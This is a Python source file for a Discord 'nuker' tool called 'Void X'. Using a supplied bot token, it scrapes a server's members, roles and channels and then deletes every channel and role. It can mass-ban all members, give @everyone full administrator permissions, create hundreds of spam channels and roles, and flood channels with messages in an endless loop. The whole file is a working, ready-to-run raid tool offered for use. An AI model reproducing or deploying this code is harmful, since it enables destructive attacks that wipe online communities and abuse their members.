import os

try:
    import aiohttp,pystyle, asyncio, sys, logging    
except:
    os.system('pip install aiohttp')
    os.system('pip install pystyle')
    

from pystyle import *
from data.utils import *

if sys.platform == 'win32':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

class Features:
    def __init__(self) -> None:
        pass

    async def fetch_guild_data(headers: dict, guild_id: int):
        async with aiohttp.ClientSession() as session:
            guild_url = f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000"
            async with session.get(guild_url, headers=headers) as response:
                json = await response.json()
                members = [json[i]['user']['id'] for i in range(len(json))]

                with open ('data/ids/members.txt', "w+") as m_id:
                    m_id.write('\n'.join(members))

        async with aiohttp.ClientSession() as session:
            role_url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
            async with session.get(role_url, headers=headers) as response:
                json_l = await response.json()
                roles = [json_l[l]['id'] for l in range(len(json_l))]

                with open('data/ids/roles.txt', "w+") as r_id:
                    r_id.write('\n'.join(roles))

        async with aiohttp.ClientSession() as session:
            channel_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
            async with session.get(channel_url, headers=headers) as response:
                json_t = await response.json()
                channels = [json_t[r]['id'] for r in range(len(json_t))]

                with open ('data/ids/channels.txt', "w+") as c_id:
                    c_id.write('\n'.join(channels))

    async def delete_channel(session, cid):
        async with session.delete(f"https://discord.com/api/v9/channels/{cid}") as resp:
            json_d = await resp.json()
            if resp.status in [201, 200, 202, 204, 204]:
                logging.info(f'\033[32m[{resp.status}]\033[0m Deleted The Channel {json_d["name"]}')
            else:
                logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Delete {cid}')

    async def channel_deleter(guild_id: int, headers: dict):
        async with aiohttp.ClientSession(headers=headers) as session:
            with open('data/ids/channels.txt', 'r') as file:
                channels = file.readlines()

            tasks = [Features.delete_channel(session, cid.strip()) for cid in channels]

            await asyncio.gather(*tasks)

    async def delete_role(session, guild_id, role, headers):
        async with session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role}",headers=headers) as resp:
            if resp.status in [201, 200, 202, 204, 204]:
                logging.info(f'\033[32m[{resp.status}]\033[0m Deleted The Role {role}')
            else:
                logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Delete {role}')

    async def role_deleter(guild_id: int, headers: dict):
        with open('data/ids/roles.txt', 'r') as file:
            roles = [role.strip() for role in file.readlines()]

        async with aiohttp.ClientSession() as session:
            tasks = [Features.delete_role(session, guild_id, role, headers) for role in roles]
            await asyncio.gather(*tasks)



    async def make_channel(guild_id: int, amount: int, headers: dict, channel_name: str):
        async with aiohttp.ClientSession(headers=headers) as session:
            tasks = []
            for i in range(amount):
                task = asyncio.ensure_future(session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',json={"name": channel_name, 'flags': 0}))
                tasks.append(task)
            responses = await asyncio.gather(*tasks)

            for resp in responses:
                if resp.status in [201, 200, 202, 204, 204]:
                    logging.info(f'\033[32m[{resp.status}]\033[0m Made The Channel {channel_name}')
                else:
                    logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Create {channel_name}')

    async def make_role(guild_id: int, amount: int, headers: dict, role_name: str):
        async with aiohttp.ClientSession(headers=headers) as session:
            tasks = []
            for i in range(amount):
                task = asyncio.ensure_future(session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles',json={"name": role_name, 'flags': 0}))
                tasks.append(task)
            responses = await asyncio.gather(*tasks)

            for resp in responses:
                if resp.status in [201, 200, 202, 204, 204]:
                    logging.info(f'\033[32m[{resp.status}]\033[0m Made The Role {role_name}')
                else:
                    logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Create {role_name}')

    async def enable_everyone_permissions(headers:dict,GUILD_ID:int):
        async with aiohttp.ClientSession() as session:
            url = f"https://discordapp.com/api/v9/guilds/{GUILD_ID}/roles"
            async with session.get(url, headers=headers) as response:
                data = await response.json()
                everyone_role = next((r for r in data if r["name"] == "@everyone"), None)

            payload = {"permissions": "2147483647"}

            url = f"https://discord.com/api/v9/guilds/{GUILD_ID}/roles/{everyone_role['id']}"
            async with session.patch(url, headers=headers, json=payload) as response:
                if response.status == 200:
                    logging.info(f'\033[32m[{response.status}]\033[0m Done!')
                else:
                    logging.info(f'\033[31m[{response.status}]\033[0m Failed To Give Perms..')

    async def ping_sender(guild_id: int, amount: int, headers: dict, message_content: str):
        async def msg_spammer(chn, session):
            async with session.post(f"https://discord.com/api/v9/channels/{chn}/messages",json={'content': message_content}) as resp:
                pass

        with open('data/ids/channels.txt', "r") as f:
            channels = f.readlines()
            channels = [chn.strip() for chn in channels]
            tasks = []

            async with aiohttp.ClientSession(headers=headers) as session:
                for chn in channels:
                    tasks.append(asyncio.ensure_future(msg_spammer(chn, session)))
                    if len(tasks) == amount:
                        break

                await asyncio.gather(*tasks)

    async def mass_banner(guild_id: int, headers: dict, id_all: bool):
        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(limit=100)) as session:
            semaphore = asyncio.Semaphore(1000)

            if id_all:
                with open('data/ids/id_banner.txt', 'r') as ids:
                    user_ids = ids.readlines()

                    async def ban_user(user_id):
                        async with semaphore:
                            async with session.request('PUT',f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
                                if resp.status in [201, 200, 202, 204, 204]:
                                    logging.info(f'\033[32m[{resp.status}]\033[0m Banned {user_id}')
                                else:
                                    logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Ban {user_id}')

                    tasks = [asyncio.create_task(ban_user(user_id.strip())) for user_id in user_ids]
                    await asyncio.gather(*tasks)
            else:
                with open('data/ids/members.txt', 'r') as ids:
                    user_ids = ids.readlines()

                    async def ban_user(user_id):
                        async with semaphore:
                            async with session.request('PUT',f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
                                if resp.status in [201, 200, 202, 204, 204]:
                                    logging.info(f'\033[32m[{resp.status}]\033[0m Banned {user_id}')
                                else:
                                    logging.info(f'\033[31m[{resp.status}]\033[0m Failed To Ban {user_id}')

                    tasks = [asyncio.create_task(ban_user(user_id.strip())) for user_id in user_ids]
                    await asyncio.gather(*tasks)



    async def runner(guild_id:int,headers:dict):
        guild = guild_id
        bot_headers = headers

        await Util.logo_flash()
        while True:
            choice = Write.Input("\n\nChoice >> ", Colors.purple_to_blue, interval=0.000)
            if choice == "X" or choice == 'x':
                quit()
            if choice == '4':
                try:
                    await Features.enable_everyone_permissions(bot_headers,guild)
                    await Features.fetch_guild_data({"Authorization": "Bot {}".format(bot_token)}, guild_id)
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '3':
                try:
                    ban_ids = Write.Input("Ban ids? (Y/n) >> ", Colors.purple_to_blue, interval=0.000)
                    if (ban_ids == 'y' or ban_ids == "Y"):
                        await Features.mass_banner(guild, bot_headers, True)
                        await Features.fetch_guild_data(bot_headers, guild)
                        await Util.logo_flash()
                    else:
                        await Features.mass_banner(guild, bot_headers, False)
                        await Features.fetch_guild_data(bot_headers, guild)
                        await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')

            if choice == '5':
                try:
                    await Features.role_deleter(guild_id=guild, headers=bot_headers)
                    await Features.fetch_guild_data(bot_headers, guild)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '6':
                try:
                    await Features.channel_deleter(guild_id=guild, headers=bot_headers)
                    await Features.fetch_guild_data(bot_headers, guild)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '2':
                try:
                    channel_name = Write.Input("Channel Name? >> ", Colors.purple_to_blue, interval=0.000)
                    amount_of_channels = Write.Input("Amount? >> ", Colors.purple_to_blue, interval=0.000)
                    await Features.make_channel(guild_id=guild, amount=int(amount_of_channels),channel_name=channel_name, headers=bot_headers)
                    await Features.fetch_guild_data(bot_headers, guild)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '1':
                try:
                    role_name = Write.Input("Role Name? >> ", Colors.purple_to_blue, interval=0.000)
                    amount_of_roles = Write.Input("Amount? >> ", Colors.purple_to_blue, interval=0.000)
                    await Features.make_role(guild, int(amount_of_roles), bot_headers, role_name)
                    await Features.fetch_guild_data(bot_headers, guild)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '7':
                try:
                    await Features.fetch_guild_data(bot_headers, guild)
                    role_name = Write.Input("Role Name? >> ", Colors.purple_to_blue, interval=0.000)
                    channel_name = Write.Input("Channel Name? >> ", Colors.purple_to_blue, interval=0.000)
                    msg_sent = Write.Input("Message? >> ", Colors.purple_to_blue, interval=0.000)
                    await Features.make_role(guild, 250, bot_headers, role_name)
                    await Features.make_channel(guild_id=guild, amount=500, channel_name=channel_name,
                                                headers=bot_headers)
                    await Features.mass_banner(guild, bot_headers, False)
                    while (True):
                        await Features.ping_sender(guild, 1, bot_headers, msg_sent)
                    await Features.mass_banner(guild, bot_headers, False)
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == 'R' or choice == 'r':
                try:
                    await Features.fetch_guild_data(bot_headers, guild)
                    logging.info(
                        f'\033[32m[!] Pruned!, You May Continue..\033[0m'
                    )
                    await asyncio.sleep(0.5)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')
            if choice == '8':
                try:
                    msg_sent = Write.Input("Message? >> ", Colors.purple_to_blue, interval=0.000)
                    amount_of_pings = Write.Input("Amount? >> ", Colors.purple_to_blue, interval=0.000)
                    await Features.ping_sender(guild, int(amount_of_pings), bot_headers, msg_sent)
                    await Features.fetch_guild_data(bot_headers, guild)
                    await Util.logo_flash()
                except:
                    logging.info(f'\033[31m[R]\033[0m Fatal Error!')

    async def checker():

        await Util.logo_flash()

        bot_token = Write.Input("\n\nToken >> ",Colors.purple_to_blue,interval=0.000)
        await Util.logo_flash()
        guild_id = Write.Input("\n\nGuild ID >> ", Colors.purple_to_blue, interval=0.000)

        await Features.fetch_guild_data({"Authorization": "Bot {}".format(bot_token)}, int(guild_id))

        await Features.runner(int(guild_id),{"Authorization":"Bot {}".format(bot_token)})


if __name__ == '__main__':
    os.system(f'cls & mode 85,20 & title Void X')
    os.system("mode con: cols=74 lines=25")
    asyncio.run(Features.checker())
